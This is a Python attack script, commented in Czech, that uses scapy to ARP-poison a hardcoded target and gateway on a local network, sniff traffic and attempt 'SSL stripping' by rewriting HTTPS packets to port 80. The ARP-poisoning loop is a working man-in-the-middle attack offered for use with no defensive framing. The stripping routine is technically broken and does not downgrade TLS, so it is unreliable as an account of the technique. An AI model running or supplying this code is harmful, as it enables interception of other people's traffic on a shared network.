import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether
import socket
import threading
import time

# Funkce pro ARP poisoning
def arp_poison(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    # Odesíláme ARP odpovědi, které říkají, že jsme brána (gateway)
    arp_packet_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    arp_packet_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)
    while True:
        scapy.send(arp_packet_target)
        scapy.send(arp_packet_gateway)
        time.sleep(2)

# Funkce pro získání MAC adresy na základě IP
def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

# Funkce pro sniffer
def packet_sniffer(interface):
    scapy.sniff(iface=interface, store=0, prn=process_packet)

# Funkce pro zpracování paketů
def process_packet(packet):
    if packet.haslayer(scapy.IP):
        ip_src = packet[scapy.IP].src
        ip_dst = packet[scapy.IP].dst
        if packet.haslayer(scapy.TCP):
            if packet[scapy.TCP].dport == 443:
                print(f"SSL Stripping: {ip_src} --> {ip_dst} (HTTPS -> HTTP)")

                # Přesměrování HTTPS na HTTP (SSL stripping)
                packet[scapy.IP].dst = ip_src
                packet[scapy.IP].src = ip_dst
                packet[scapy.TCP].dport = 80  # HTTP port
                del packet[scapy.IP].len
                del packet[scapy.IP].chksum
                del packet[scapy.TCP].chksum

                scapy.send(packet)

# Hlavní funkce pro spuštění všech akcí
def start_attack(target_ip, gateway_ip, interface="WiFi 2"):
    print("Začínáme ARP poisoning...")
    poison_thread = threading.Thread(target=arp_poison, args=(target_ip, gateway_ip))
    poison_thread.start()
    
    print(f"Začínám sniffer na rozhraní {interface}...")
    packet_sniffer(interface)

# Spusť tento skript s IP adresami cílového zařízení a gateway
start_attack("10.0.1.33", "10.0.1.138")
